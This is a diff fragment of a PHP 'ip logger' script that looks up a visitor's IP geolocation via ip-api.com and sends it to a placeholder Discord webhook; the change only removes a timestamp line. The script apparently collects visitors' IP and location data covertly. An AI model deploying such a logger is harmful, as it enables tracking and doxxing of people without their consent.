@@ -28,13 +28,10 @@ $ip_info = file_get_contents("http://www.ip-api.com/line/".getIP());
 // log ip
 $webhookurl = "DISCORD_WEBHOOK_HERE";
 
-$timestamp = date("c", strtotime("now"));
-
 $json_data = json_encode([
     "content" => $ip_info,
     "username" => "ip logger"
 ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
-
 
 $ch = curl_init( $webhookurl );
 curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
